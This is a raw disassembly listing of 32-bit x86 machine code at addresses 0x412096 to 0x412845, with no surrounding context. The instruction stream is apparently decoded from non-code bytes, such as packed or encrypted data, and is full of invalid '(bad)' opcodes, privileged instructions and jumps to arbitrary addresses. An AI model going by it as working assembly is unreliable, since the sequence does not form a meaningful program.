  412096:	cmp    ebp,DWORD PTR [edi+eiz*4-0x34]
  41209a:	sub    al,BYTE PTR [ebx-0x6c3418e2]
  4120a0:	or     ah,BYTE PTR [ecx+eax*2]
  4120a3:	sub    al,0x3d
  4120a5:	mov    dh,0xe
  4120a7:	lods   eax,DWORD PTR ds:[esi]
  4120a8:	adc    eax,0x161ce968
  4120ad:	(bad)  
  4120ae:	xor    al,0xf2
  4120b0:	in     eax,0x7b
  4120b2:	dec    edx
  4120b3:	adc    al,0x32
  4120b5:	pop    esp
  4120b6:	jne    0x4120b6
  4120b8:	inc    eax
  4120b9:	pusha  
  4120ba:	or     bl,BYTE PTR [ebp+0x6bbc2879]
  4120c0:	loope  0x41208b
  4120c2:	inc    edx
  4120c3:	push   ds
  4120c4:	jbe    0x4120ab
  4120c6:	or     eax,0x151a8592
  4120cb:	inc    ebp
  4120cc:	shl    DWORD PTR [eax+0x36ab169d],cl
  4120d2:	push   eax
  4120d3:	test   BYTE PTR ds:0x9e2734f0,bl
  4120d9:	loop   0x412095
  4120db:	pop    ss
  4120dc:	or     dh,BYTE PTR [edi]
  4120de:	xchg   ebx,eax
  4120df:	mov    gs,WORD PTR [esp+esi*2]
  4120e2:	jp     0x41207b
  4120e4:	and    edx,DWORD PTR [eax-0x4a]
  4120e7:	jl     0x412100
  4120e9:	jns    0x4120e5
  4120eb:	test   al,0x9a
  4120ed:	or     BYTE PTR [ebp-0x69],ah
  4120f0:	and    eax,0x7b79b79c
  4120f5:	inc    eax
  4120f6:	jl     0x412083
  4120f8:	out    0x22,eax
  4120fa:	icebp  
  4120fb:	and    esp,DWORD PTR [esi-0x544b5a84]
  412101:	jb     0x412145
  412103:	leave  
  412104:	in     eax,dx
  412105:	jo     0x4120cc
  412107:	into   
  412108:	sub    al,ah
  41210a:	or     DWORD PTR [eax],ecx
  41210c:	add    eax,0xa698ce3e
  412111:	bound  esi,QWORD PTR [ebp+0x983f1a0]
  412117:	popf   
  412118:	xor    ebp,esp
  41211a:	cmp    esi,edx
  41211c:	adc    BYTE PTR [ecx+0x64],0xa0
  412120:	push   esp
  412121:	jne    0x4120b2
  412123:	mov    cl,0xf9
  412125:	imul   ebx,DWORD PTR [ebp-0x3a346b10],0xffffffe5
  41212c:	sub    esp,DWORD PTR [esi-0x5ccdd74c]
  412132:	sbb    BYTE PTR [ecx-0x4f],cl
  412135:	test   eax,0xd800ee3
  41213a:	pop    edx
  41213b:	mov    ecx,0x2753a25b
  412140:	adc    DWORD PTR [eax+0x79fe1fe5],esp
  412146:	clc    
  412147:	sub    eax,0x3de4d190
  41214c:	cmp    DWORD PTR [edx],eax
  41214e:	adc    al,0x9e
  412150:	add    eax,0xa04a94df
  412155:	imul   esp,DWORD PTR [esi],0x3e
  412158:	mov    bl,0xfd
  41215a:	fs stos DWORD PTR es:[edi],eax
  41215c:	xor    eax,0xf56241e4
  412161:	jg     0x412144
  412163:	dec    edi
  412164:	inc    esi
  412165:	or     al,0x42
  412167:	mov    edi,0xa03b2814
  41216c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41216d:	jne    0x41218c
  41216f:	cmp    dh,BYTE PTR [edi]
  412171:	ss or  eax,0xeb7aa88
  412177:	pushf  
  412178:	lods   al,BYTE PTR ds:[esi]
  412179:	jnp    0x41213c
  41217b:	lea    esp,[ebp-0x4c]
  41217e:	stos   DWORD PTR es:[edi],eax
  41217f:	mov    fs:0x40794464,al
  412185:	dec    ecx
  412186:	rcr    DWORD PTR [esi+0x89f929f],cl
  41218c:	mov    edi,0xbf714589
  412191:	bound  ebx,QWORD PTR [esi+0x7161aae9]
  412197:	sbb    dl,BYTE PTR [ecx+0x11]
  41219a:	popf   
  41219b:	fmulp  st(0),st
  41219d:	dec    ebx
  41219e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41219f:	lock pop ebx
  4121a1:	sti    
  4121a2:	stos   BYTE PTR es:[edi],al
  4121a3:	push   edx
  4121a4:	int3   
  4121a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121a6:	in     eax,dx
  4121a7:	pop    esi
  4121a8:	aaa    
  4121a9:	(bad)  
  4121aa:	nop
  4121ab:	cmc    
  4121ac:	dec    esp
  4121ad:	and    al,0x24
  4121af:	xor    al,0xf3
  4121b1:	outs   dx,DWORD PTR ds:[esi]
  4121b2:	push   ds
  4121b3:	mov    cr7,edi
  4121b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121b7:	push   0x23
  4121b9:	int3   
  4121ba:	push   ebp
  4121bb:	mov    cl,0xcc
  4121bd:	xchg   DWORD PTR [eax+0x31],edx
  4121c0:	pop    esi
  4121c1:	(bad)  
  4121c2:	cmp    dl,BYTE PTR [edx+0x3f926c07]
  4121c8:	inc    ecx
  4121c9:	pop    edx
  4121ca:	cmp    BYTE PTR [eax-0x4b],bl
  4121cd:	imul   eax,DWORD PTR [edx+0x4ef8c4cc],0xffffff97
  4121d4:	cmp    bl,BYTE PTR [eax+edi*1]
  4121d7:	dec    ebp
  4121d8:	cmc    
  4121d9:	pop    edx
  4121da:	fwait
  4121db:	adc    bh,BYTE PTR [ecx+0x50]
  4121de:	jge    0x412231
  4121e0:	bound  edi,QWORD PTR [ebp-0x60a2d1ab]
  4121e6:	not    esp
  4121e8:	xor    BYTE PTR [eax],bl
  4121ea:	leave  
  4121eb:	test   edx,ebp
  4121ed:	inc    esi
  4121ee:	test   BYTE PTR [ecx+ebp*1+0x24],ch
  4121f2:	push   ebp
  4121f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121f4:	pusha  
  4121f5:	mov    dh,0x91
  4121f7:	scas   eax,DWORD PTR es:[edi]
  4121f8:	fisubr DWORD PTR [ebx+0x51]
  4121fb:	pop    esp
  4121fc:	mov    dh,0xc0
  4121fe:	sub    DWORD PTR [edi],edx
  412200:	int    0x9
  412202:	xchg   ebx,eax
  412203:	mov    ds:0xf6ad07ab,eax
  412208:	cdq    
  412209:	shr    eax,cl
  41220b:	inc    esi
  41220c:	repz ret 0xaee
  412210:	test   BYTE PTR [edx],dl
  412212:	rcl    DWORD PTR [eax-0x4],1
  412215:	pop    ss
  412216:	sbb    ebp,DWORD PTR [edx-0x2c]
  412219:	imul   cl
  41221b:	xor    eax,DWORD PTR [esi+edx*2-0x49]
  41221f:	call   0x7fd79d59
  412224:	adc    BYTE PTR [ebp+0xdb6eb03],bl
  41222a:	mov    al,ds:0x80164837
  41222f:	cs aas 
  412231:	loope  0x41224b
  412233:	cli    
  412234:	add    ebp,DWORD PTR [esi-0x6a]
  412237:	adc    ah,BYTE PTR [edi+0x1e]
  41223a:	imul   ebx,DWORD PTR [edi-0x5a],0xffffff93
  41223e:	push   esp
  41223f:	repz sub eax,0x8743f7b8
  412245:	lock pop ebx
  412247:	pop    edx
  412249:	idiv   DWORD PTR [eax+0x39]
  41224c:	iret   
  41224d:	and    al,0x43
  41224f:	cmp    dh,ah
  412251:	aaa    
  412252:	add    BYTE PTR [eax],bh
  412254:	mov    eax,0x62d23975
  412259:	jl     0x4122a7
  41225b:	bsf    ebx,DWORD PTR [edi+ebp*4-0x57f3ed82]
  412263:	stos   BYTE PTR es:[edi],al
  412264:	or     esi,DWORD PTR [edi+ebx*2]
  412267:	test   DWORD PTR [edx+0x1e],esp
  41226a:	(bad)  
  41226b:	stos   BYTE PTR es:[edi],al
  41226c:	mov    ecx,0x835201d1
  412271:	mov    fs,WORD PTR [esi]
  412273:	inc    edi
  412274:	inc    ebp
  412275:	inc    edi
  412276:	xor    BYTE PTR [eax-0x5f],bh
  412279:	xor    DWORD PTR [edi],eax
  41227b:	jmp    0x4122be
  41227d:	(bad)  
  41227f:	in     al,0x4c
  412281:	pop    ds
  412282:	ret    
  412283:	cmp    ecx,DWORD PTR [eax]
  412285:	dec    ebp
  412286:	pusha  
  412287:	daa    
  412288:	in     eax,dx
  412289:	sub    bl,BYTE PTR [ebx-0x61]
  41228c:	and    al,0xba
  41228e:	hlt    
  41228f:	sub    eax,0x1b275fa
  412294:	stc    
  412295:	inc    edi
  412296:	es push ss
  412298:	inc    eax
  412299:	ss xchg edx,ebp
  41229c:	jle    0x412250
  41229e:	adc    al,0x42
  4122a0:	xchg   ebx,eax
  4122a1:	dec    dl
  4122a3:	and    bl,BYTE PTR [eax]
  4122a5:	adc    ebx,ecx
  4122a7:	inc    esi
  4122a8:	jle    0x4122ef
  4122aa:	retf   
  4122ab:	jg     0x41225a
  4122ad:	mov    al,0x16
  4122af:	xchg   DWORD PTR [edi-0x2440a41f],eax
  4122b5:	jno    0x41226e
  4122b7:	ret    0xfc28
  4122ba:	(bad)  
  4122bc:	cld    
  4122bd:	push   DWORD PTR [eax+0x1dbbedfe]
  4122c3:	pop    ebx
  4122c4:	mov    esp,0x20848223
  4122c9:	(bad)  
  4122ca:	cmp    esp,eax
  4122cc:	dec    esp
  4122cd:	int    0x38
  4122cf:	push   0xd694f024
  4122d4:	jmp    0x412334
  4122d6:	jnp    0x4122f0
  4122d8:	mov    cl,0x65
  4122da:	mov    al,ds:0xc45c1566
  4122df:	fcomp  DWORD PTR [edi+0x5e8f1413]
  4122e5:	dec    edi
  4122e6:	xor    bh,BYTE PTR [esi+esi*8]
  4122e9:	mov    eax,0x68b76329
  4122ee:	pop    es
  4122ef:	rcl    DWORD PTR [ebp+ebp*4+0x10],1
  4122f3:	jl     0x412277
  4122f5:	and    BYTE PTR [ecx+0x0],ch
  4122f8:	push   esp
  4122f9:	cdq    
  4122fa:	inc    edi
  4122fb:	and    DWORD PTR [edx-0x5a9bd20a],esi
  412301:	cdq    
  412302:	(bad)  
  412303:	dec    DWORD PTR [edx-0x3f]
  412306:	push   esi
  412307:	xor    DWORD PTR [eax+0x51fab2a],edx
  41230d:	sbb    al,0xcd
  41230f:	adc    DWORD PTR [ebp+0x4c],ebp
  412312:	lea    edx,[ebx]
  412314:	mov    ah,BYTE PTR [eax+0x67]
  412317:	fwait
  412318:	ja     0x4122e2
  41231a:	pop    ss
  41231b:	mov    ds,WORD PTR [ecx+0x36]
  41231e:	es (bad) 
  412320:	shr    DWORD PTR [esi+0x7],1
  412323:	cvtps2pd xmm4,QWORD PTR [esi-0x135e0ca0]
  41232a:	push   0xc33e18e5
  41232f:	imul   esi,DWORD PTR [eax],0xbc1e9045
  412335:	cmp    BYTE PTR [esi-0x6d],dl
  412338:	shl    esi,cl
  41233a:	ror    DWORD PTR [esi+edx*4],cl
  41233d:	adc    DWORD PTR [edi-0x32],esp
  412340:	in     eax,dx
  412341:	lahf   
  412342:	loope  0x4122cc
  412344:	mov    cl,0x2d
  412346:	adc    bh,bl
  412348:	jl     0x41234b
  41234a:	div    bl
  41234c:	ret    0x83dc
  41234f:	adc    esp,esi
  412351:	je     0x412368
  412353:	rcl    BYTE PTR [esi],cl
  412355:	loope  0x4122fc
  412357:	jo     0x41238a
  412359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41235a:	jns    0x4123b6
  41235c:	inc    ebp
  41235d:	inc    esi
  41235e:	nop
  41235f:	shl    esi,0x46
  412362:	cmp    ebx,DWORD PTR [eax-0x4b3f6411]
  412368:	dec    edx
  412369:	mov    cl,0x91
  41236b:	imul   edi,DWORD PTR [ebx+0x74],0x34
  41236f:	jo     0x4123d4
  412371:	ins    DWORD PTR es:[edi],dx
  412372:	pop    ebx
  412373:	repnz mov cl,0xc1
  412376:	and    eax,0x320566b8
  41237b:	imul   ebp,DWORD PTR [ebp-0x697d28dd],0x2b
  412382:	cdq    
  412383:	jno    0x4123d1
  412385:	leave  
  412386:	(bad)  
  412387:	mov    ds:0x245d878d,eax
  41238c:	jmp    0xf3ad5909
  412391:	int3   
  412392:	popa   
  412393:	xchg   esp,eax
  412394:	jmp    0xa28b:0xf541d65f
  41239b:	retf   
  41239c:	sbb    esp,DWORD PTR [ecx+0x43a01ab]
  4123a2:	xor    al,bl
  4123a4:	sbb    DWORD PTR [edi+esi*4+0x62],0x1d
  4123a9:	xchg   edi,eax
  4123aa:	inc    edx
  4123ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123ac:	mov    dh,0x41
  4123ae:	daa    
  4123af:	not    al
  4123b1:	pop    edi
  4123b2:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4123b4:	sub    BYTE PTR [esi],dh
  4123b6:	aam    0x5d
  4123b8:	stos   BYTE PTR es:[edi],al
  4123b9:	mov    esp,0x9373ee4f
  4123be:	loope  0x412395
  4123c0:	div    bl
  4123c2:	sbb    BYTE PTR [esi+0x50],dh
  4123c5:	popf   
  4123c6:	repz mov si,0xab56
  4123cb:	mov    ch,cl
  4123cd:	test   eax,0x8e95e253
  4123d2:	adc    ebx,edx
  4123d4:	add    edi,0x77d7d884
  4123da:	jne    0x412360
  4123dc:	jmp    0x412404
  4123de:	inc    esp
  4123df:	xchg   esi,eax
  4123e0:	jl     0x4123eb
  4123e2:	js     0x4123f2
  4123e4:	and    BYTE PTR [esi],cl
  4123e6:	mov    al,ds:0xf9d49c67
  4123eb:	add    eax,0xb1eb1299
  4123f0:	js     0x412405
  4123f2:	sti    
  4123f3:	cvtps2pd xmm0,QWORD PTR ds:0x60cfa090
  4123fa:	or     BYTE PTR [ecx-0xadca087],cl
  412400:	test   al,0xa8
  412402:	ins    BYTE PTR es:[edi],dx
  412403:	jmp    0x412407
  412405:	lods   al,BYTE PTR ds:[esi]
  412406:	sub    BYTE PTR ss:[ebp+0xf],ah
  41240a:	adc    edi,ebx
  41240c:	loopne 0x4123bf
  41240e:	test   eax,0x4c7fc841
  412413:	ds dec ecx
  412415:	ins    DWORD PTR es:[edi],dx
  412416:	pop    edi
  412417:	pop    ecx
  412418:	bound  ebx,QWORD PTR [ebp+0x2ddd648]
  41241e:	push   esp
  41241f:	lods   eax,DWORD PTR ds:[esi]
  412420:	jle    0x41243b
  412422:	cwde   
  412423:	pop    esi
  412424:	in     al,dx
  412425:	push   ds
  412426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412427:	jg     0x412499
  412429:	leave  
  41242a:	sbb    DWORD PTR [ecx-0x60],0x63
  41242e:	clc    
  41242f:	dec    ecx
  412430:	xchg   edx,eax
  412431:	ins    BYTE PTR es:[edi],dx
  412432:	sbb    edi,DWORD PTR [eax]
  412434:	or     al,0x4f
  412436:	stos   BYTE PTR es:[edi],al
  412437:	(bad)
  41243a:	lahf   
  41243b:	inc    edi
  41243c:	push   es
  41243d:	pop    ecx
  41243e:	xor    BYTE PTR [ebx+0x36],al
  412441:	test   BYTE PTR [esi+0x5c55a2f1],dh
  412447:	jns    0x4123da
  412449:	inc    esp
  41244a:	jns    0x4123d1
  41244c:	(bad)  
  41244d:	and    eax,ecx
  41244f:	adc    ecx,edi
  412451:	int3   
  412452:	in     al,0xa6
  412454:	xlat   BYTE PTR ds:[ebx]
  412455:	sbb    BYTE PTR [edi-0x58],cl
  412458:	adc    DWORD PTR [esi+eiz*4],edi
  41245b:	iret   
  41245c:	cmc    
  41245d:	jmp    0x6649:0x37388b1c
  412464:	mov    DWORD PTR [edi+ebp*4+0x4339e5b9],esi
  41246b:	es enter 0x68fc,0x79
  412470:	push   ss
  412471:	add    BYTE PTR [eax-0x4c67e69c],bl
  412477:	xor    al,0x6a
  412479:	outs   dx,DWORD PTR ds:[esi]
  41247a:	adc    ebp,DWORD PTR [edi+0x237f490f]
  412480:	xor    esi,DWORD PTR [ebp+0x3523db44]
  412486:	ja     0x412470
  412488:	stc    
  412489:	inc    edi
  41248a:	in     al,0xf4
  41248c:	fldenv [edi-0x622ac029]
  412493:	inc    esp
  412494:	aad    0x80
  412496:	test   eax,0x4c42a06c
  41249b:	fnstcw WORD PTR [edx-0x47ea0ab7]
  4124a1:	dec    esp
  4124a2:	push   eax
  4124a3:	stos   DWORD PTR es:[edi],eax
  4124a4:	inc    ebp
  4124a5:	hlt    
  4124a6:	mov    eax,ds:0x44ed781f
  4124ab:	and    al,0x86
  4124ad:	mov    ds:0xed786255,eax
  4124b2:	int3   
  4124b3:	cmp    eax,esi
  4124b5:	cmp    dh,BYTE PTR [edi-0x361ae750]
  4124bb:	push   esi
  4124bc:	stc    
  4124bd:	inc    ecx
  4124be:	pop    edx
  4124bf:	std    
  4124c0:	mov    eax,0x86ccd5a0
  4124c5:	xor    BYTE PTR [edi],al
  4124c7:	shr    DWORD PTR ds:0x7a40c7da,cl
  4124cd:	jecxz  0x41245f
  4124cf:	cmp    al,0x86
  4124d1:	mov    edi,0x9ce15456
  4124d6:	imul   edx,DWORD PTR [ebp+0x7c18c6bb],0x9b53d608
  4124e0:	xchg   DWORD PTR [eax+0x3db154bc],edi
  4124e6:	loope  0x412545
  4124e8:	mov    dl,0x7c
  4124ea:	cmp    BYTE PTR [edi-0x47],bh
  4124ed:	mov    bh,BYTE PTR [ecx+0x14277f1a]
  4124f3:	aaa    
  4124f4:	imul   edx,ebx,0x6d
  4124f7:	mov    ds:0x317d170f,al
  4124fc:	(bad)
  4124ff:	out    0xa4,eax
  412501:	pusha  
  412502:	xor    esi,DWORD PTR [eax]
  412504:	ins    DWORD PTR es:[edi],dx
  412505:	push   esp
  412506:	mov    al,ds:0xccc2eb54
  41250b:	aas    
  41250c:	cmp    BYTE PTR [edx+edi*1],ch
  41250f:	(bad)  
  412510:	xor    edx,DWORD PTR [ebp-0x4289b924]
  412516:	jo     0x4124b2
  412518:	xchg   DWORD PTR [eax+0x58546b29],ebx
  41251e:	cmp    cl,BYTE PTR [edi]
  412520:	scas   eax,DWORD PTR es:[edi]
  412521:	scas   al,BYTE PTR es:[edi]
  412522:	jae    0x412515
  412524:	(bad)  
  412525:	sub    eax,DWORD PTR [eax+0x1b]
  412528:	fld    st(0)
  41252a:	push   ds
  41252b:	ret    
  41252c:	xor    al,0x82
  41252e:	test   al,0xd6
  412530:	imul   ecx,DWORD PTR [esi+0x204a08d0],0xf42d7c9
  41253a:	icebp  
  41253b:	mov    esi,0x37adf7a8
  412540:	inc    esp
  412541:	inc    edx
  412542:	push   esp
  412543:	jno    0x412546
  412545:	xchg   ecx,eax
  412546:	dec    DWORD PTR [ebx+0x2fba6b35]
  41254c:	push   ebp
  41254d:	clc    
  41254e:	hlt    
  41254f:	and    DWORD PTR [ecx+0x435706a0],esp
  412555:	add    ah,cl
  412557:	inc    ebx
  412558:	pop    ecx
  412559:	inc    eax
  41255a:	push   cs
  41255b:	xor    BYTE PTR [edi-0x3f0bf4cf],ch
  412561:	addr16 add al,0xf5
  412564:	jecxz  0x41250f
  412566:	out    dx,al
  412567:	push   edi
  412568:	inc    esi
  412569:	mov    edi,0xd542ab4e
  41256e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41256f:	or     DWORD PTR [edx-0x76],ebx
  412572:	inc    ecx
  412573:	addr16 dec esi
  412575:	jmp    0x4125ec
  412577:	aam    0x42
  412579:	mov    bh,0x4b
  41257b:	dec    ecx
  41257c:	pop    esi
  41257d:	xor    BYTE PTR [edi+0x15aa838b],0x57
  412584:	xchg   ebp,eax
  412585:	push   eax
  412586:	inc    edi
  412587:	hlt    
  412588:	ret    
  412589:	sub    dl,ch
  41258b:	fldcw  WORD PTR [edi+eax*8]
  41258e:	out    dx,al
  41258f:	mov    edx,ds
  412591:	add    BYTE PTR [edx+eiz*8+0xf],bh
  412595:	lods   al,BYTE PTR ds:[esi]
  412596:	popa   
  412597:	test   eax,0x3b19fed6
  41259c:	je     0x412591
  41259e:	stos   BYTE PTR es:[edi],al
  41259f:	fcomp  QWORD PTR [edi]
  4125a1:	ins    BYTE PTR es:[edi],dx
  4125a2:	enter  0x1716,0x97
  4125a6:	stos   BYTE PTR es:[edi],al
  4125a7:	xchg   ecx,eax
  4125a8:	pop    eax
  4125a9:	sub    DWORD PTR [ebx],eax
  4125ab:	jecxz  0x4125ee
  4125ad:	out    dx,eax
  4125ae:	ins    BYTE PTR es:[edi],dx
  4125af:	mov    ebx,DWORD PTR ds:0x2aa1c221
  4125b5:	cmp    eax,0x28e3f98f
  4125ba:	scas   eax,DWORD PTR es:[edi]
  4125bb:	xor    al,0xfb
  4125bd:	adc    DWORD PTR [edi],ebx
  4125bf:	jmp    0x111d0170
  4125c4:	mov    eax,ds:0x1491ebf7
  4125c9:	ja     0x4125f6
  4125cb:	mov    esp,0x67ea78df
  4125d0:	out    0xc4,al
  4125d2:	mov    ecx,0xbcd1ce8f
  4125d7:	psraw  mm1,QWORD PTR [ecx-0x4ff3bad2]
  4125de:	int3   
  4125df:	ins    DWORD PTR es:[edi],dx
  4125e0:	or     eax,0x2b04fde3
  4125e5:	adc    al,0x46
  4125e7:	or     ah,BYTE PTR [ebx+0x5b]
  4125ea:	nop
  4125eb:	(bad)  
  4125ec:	lods   al,BYTE PTR ds:[esi]
  4125ed:	inc    ebx
  4125ee:	push   ebx
  4125ef:	pop    eax
  4125f0:	dec    ebp
  4125f1:	sbb    BYTE PTR [edx-0x57],cl
  4125f4:	cmp    BYTE PTR [esi-0x29],cl
  4125f7:	sbb    al,0xe
  4125f9:	enter  0x8345,0xdf
  4125fd:	call   FWORD PTR [ecx-0x6c1ee197]
  412603:	and    BYTE PTR [edi],al
  412605:	sub    DWORD PTR [ebp+0x13],ebp
  412608:	xchg   ecx,eax
  412609:	sbb    esp,DWORD PTR [esi]
  41260b:	pop    eax
  41260c:	imul   esi,DWORD PTR [ebx+0x63],0xffffffa2
  412610:	jbe    0x4125f7
  412612:	pop    es
  412613:	outs   dx,DWORD PTR ds:[esi]
  412614:	xchg   ecx,eax
  412615:	popa   
  412616:	out    dx,al
  412617:	outs   dx,BYTE PTR ds:[esi]
  412618:	pushf  
  412619:	lahf   
  41261a:	imul   ecx,DWORD PTR [ebx-0x71b8bac],0xa425d0c1
  412624:	push   esp
  412625:	add    edi,DWORD PTR [bp+si]
  412628:	sub    ebx,DWORD PTR [ecx]
  41262a:	repnz adc bl,bh
  41262d:	cmp    eax,0xc1bb8a3
  412632:	jns    0x41266f
  412634:	xor    esp,ecx
  412636:	lea    ebx,[ecx]
  412638:	ffree  st(6)
  41263a:	dec    esp
  41263b:	lahf   
  41263c:	inc    eax
  41263d:	hlt    
  41263e:	pop    ebp
  41263f:	push   0xc750a8e2
  412644:	mov    bh,0x7b
  412646:	ins    BYTE PTR es:[edi],dx
  412647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412648:	dec    esp
  412649:	(bad)  
  41264a:	inc    esp
  41264b:	and    BYTE PTR [ecx-0x78896590],ch
  412651:	(bad)  
  412652:	in     al,dx
  412653:	dec    edx
  412654:	push   ebp
  412655:	mov    al,ds:0x359d135e
  41265a:	mov    al,ds:0x95aa5f54
  41265f:	sahf   
  412660:	pop    ss
  412661:	mov    ebp,0x24c02f6f
  412666:	mov    dh,BYTE PTR [edx-0x65951950]
  41266c:	xchg   edi,eax
  41266d:	fwait
  41266e:	pop    ebx
  41266f:	sub    al,0xe0
  412671:	xor    eax,0x8cf8b727
  412676:	jae    0x41266f
  412678:	scas   eax,DWORD PTR es:[edi]
  412679:	gs jb  0x412665
  41267c:	mov    dl,0xc6
  41267e:	ds cli 
  412680:	add    al,0xc3
  412682:	cmp    BYTE PTR [esi+0xc],bh
  412685:	into   
  412686:	and    al,0x38
  412688:	dec    edi
  412689:	mov    esp,DWORD PTR [ebx]
  41268b:	cmp    eax,DWORD PTR [ebp-0x79]
  41268e:	jbe    0x41263c
  412690:	add    eax,0xe66076c0
  412695:	jg     0x41266f
  412697:	push   eax
  412698:	adc    eax,0xe18f98da
  41269d:	fs lahf 
  41269f:	in     eax,0x14
  4126a1:	call   0xa00ae71a
  4126a6:	mov    al,0x4e
  4126a8:	add    al,ch
  4126aa:	jb     0x412652
  4126ac:	sbb    BYTE PTR [ebp+esi*8-0x9],cl
  4126b0:	or     BYTE PTR [ebx+0x37d1fd8a],bh
  4126b6:	(bad)  
  4126b7:	nop
  4126b8:	(bad)  
  4126b9:	jo     0x412665
  4126bb:	ror    DWORD PTR [edx-0x2ee7cd7b],1
  4126c1:	popf   
  4126c2:	pop    es
  4126c3:	inc    edi
  4126c4:	jns    0x4126f4
  4126c6:	add    cl,BYTE PTR [edx-0x53]
  4126c9:	mov    ch,0x63
  4126cb:	cwde   
  4126cc:	popa   
  4126cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126ce:	add    eax,0xdcc5c8bf
  4126d3:	ins    DWORD PTR es:[edi],dx
  4126d4:	sub    BYTE PTR [edx],al
  4126d6:	push   0x9d2da677
  4126db:	cld    
  4126dc:	fiadd  DWORD PTR [esi+0x1054d37e]
  4126e2:	or     eax,0x63d233f9
  4126e7:	sbb    ch,BYTE PTR [ebp+0x24072016]
  4126ed:	pop    edx
  4126ee:	mov    edi,0xa7565096
  4126f3:	lods   al,BYTE PTR ds:[esi]
  4126f4:	pusha  
  4126f5:	pop    edi
  4126f6:	sti    
  4126f7:	push   edi
  4126f8:	fdivr  DWORD PTR [ecx-0x63]
  4126fb:	jl     0x4126a1
  4126fd:	pop    esp
  4126fe:	mov    bh,dl
  412700:	inc    esp
  412701:	data16 or BYTE PTR [ecx+0xe59c1fc],dl
  412708:	ja     0x4126d1
  41270a:	add    bh,BYTE PTR [edx-0x11]
  41270d:	adc    BYTE PTR [ebx],ah
  41270f:	fmul   DWORD PTR [eax]
  412711:	mov    esp,DWORD PTR [eax-0x40]
  412714:	and    ah,BYTE PTR [ebp+0x65bfeb99]
  41271a:	mov    ecx,DWORD PTR [edx+0x1b21521e]
  412720:	or     ebx,ebp
  412722:	out    0xa0,eax
  412724:	test   eax,0xaa772f30
  412729:	push   esp
  41272b:	push   ebx
  41272c:	add    eax,0x8c93e162
  412731:	int    0x7a
  412733:	repnz cmp DWORD PTR [eax-0x6d],ecx
  412737:	mov    eax,ds:0xf0ed3a37
  41273c:	mov    edx,0xa15157c9
  412741:	(bad)  [eax+0x58]
  412744:	pop    eax
  412745:	mov    ecx,DWORD PTR [esi-0x45]
  412748:	cmp    dl,bl
  41274a:	stos   DWORD PTR es:[edi],eax
  41274b:	and    dh,al
  41274d:	dec    ebp
  41274e:	stos   DWORD PTR es:[edi],eax
  41274f:	aam    0x29
  412751:	dec    edi
  412752:	add    al,0x6e
  412754:	jno    0x412782
  412756:	adc    eax,0xdabd883b
  41275b:	inc    esi
  41275c:	jmp    0x412720
  41275e:	and    BYTE PTR [ebp-0x4d8b550d],0xaf
  412765:	push   0xa852c863
  41276a:	int    0xaa
  41276c:	sbb    bl,BYTE PTR [esi+0x40]
  41276f:	adc    bl,BYTE PTR [edx]
  412771:	add    BYTE PTR [edx],0xa6
  412774:	pop    edx
  412775:	out    0x89,al
  412777:	sbb    ah,cl
  412779:	mov    WORD PTR [edx-0x49cc656b],?
  41277f:	jl     0x4127e0
  412781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412782:	sbb    DWORD PTR [ecx],ebx
  412784:	shl    BYTE PTR [edx-0x60e0e41c],1
  41278a:	cmp    eax,0x511c78ab
  41278f:	inc    esp
  412790:	imul   ecx,DWORD PTR [ebx-0x5588c477],0x43
  412797:	clc    
  412798:	cmp    ebp,DWORD PTR [edx-0x3f236a67]
  41279e:	xchg   ebp,eax
  41279f:	inc    ebp
  4127a0:	fadd   QWORD PTR [esp+edx*2-0x1e]
  4127a4:	test   eax,0x45e5d325
  4127a9:	cmp    ebx,0xfe68aa89
  4127af:	mov    ds:0xf71233cd,eax
  4127b4:	arpl   cx,si
  4127b6:	pop    eax
  4127b7:	add    BYTE PTR [esi-0x7b6803f2],bl
  4127bd:	adc    al,0xc8
  4127bf:	push   0xacb8be8f
  4127c4:	pop    esp
  4127c5:	xor    DWORD PTR [ebx],0xffffffc8
  4127c8:	or     eax,0x6de58d13
  4127cd:	(bad)  
  4127ce:	scas   al,BYTE PTR es:[edi]
  4127cf:	push   ecx
  4127d0:	cvttps2pi mm0,xmm0
  4127d3:	loopne 0x412798
  4127d5:	int3   
  4127d6:	cld    
  4127d7:	mov    esi,0xeab11cb8
  4127dc:	cmp    esp,DWORD PTR [edi]
  4127de:	ficomp DWORD PTR [eax]
  4127e0:	mov    edx,0x69ca53ba
  4127e5:	in     eax,dx
  4127e6:	dec    esi
  4127e7:	inc    ecx
  4127e8:	mov    bl,0x92
  4127ea:	les    edi,FWORD PTR [esi-0x3b]
  4127ed:	addr16 sbb eax,0x9f2e9a32
  4127f3:	xchg   ecx,eax
  4127f4:	xchg   ecx,eax
  4127f5:	cmc    
  4127f6:	dec    esi
  4127f7:	push   esi
  4127f8:	cmp    al,0xd9
  4127fa:	sub    al,0x79
  4127fc:	jno    0x4127f9
  4127fe:	mov    eax,0x8ae76c4e
  412803:	xchg   ebp,eax
  412804:	ror    bh,1
  412806:	or     BYTE PTR [ebp+0x70],bl
  412809:	xchg   esi,eax
  41280a:	sti    
  41280b:	or     BYTE PTR [ebx-0x5eb8409a],ch
  412811:	jns    0x412799
  412813:	std    
  412814:	xchg   ebp,eax
  412815:	(bad)  
  412816:	stos   BYTE PTR es:[edi],al
  412817:	sahf   
  412818:	or     bh,BYTE PTR [ebx-0x70]
  41281b:	in     al,dx
  41281c:	or     ebp,DWORD PTR [eax+0x70]
  41281f:	pushf  
  412820:	mov    ebp,0x2a837021
  412825:	repz sub DWORD PTR [edx-0x3539f093],ebp
  41282c:	jmp    0xfb80:0xa900aae9
  412833:	gs (bad) 
  412835:	pop    ds
  412836:	xchg   edi,eax
  412837:	ja     0x412823
  412839:	mov    ah,0x25
  41283b:	cmp    ah,dh
  41283d:	cdq    
  41283e:	cmp    eax,0xfe6e1075
  412843:	inc    ecx
  412844:	push   cs
  412845:	mov    dl,0x8
